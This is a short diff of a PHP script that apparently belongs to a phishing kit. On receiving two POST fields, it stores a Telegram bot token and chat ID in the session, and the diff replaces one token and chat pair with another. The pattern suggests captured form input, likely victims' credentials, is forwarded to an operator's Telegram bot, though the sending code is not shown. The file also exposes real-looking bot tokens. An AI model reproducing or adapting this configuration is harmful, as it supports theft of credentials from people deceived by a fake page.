@@ -5,8 +5,8 @@
     if(isset($_POST['gtrip01']) && isset($_POST['gtrip02'])){
 
         $_SESSION['cont'] = 3;
-        @$_SESSION['tlg1'] = "6755720052:AAGTUPeVMgjNVah3rQ_LcXar6VhbvUYut80";
-        @$_SESSION['cht1'] = "-4208407233";
+        @$_SESSION['tlg1'] = "7862008835:AAHbg_o6m_ToegloI3EkEwydb6fFcir279k";
+        @$_SESSION['cht1'] = "-4711254149";
 
         @$_SESSION['ips'] = '';
 
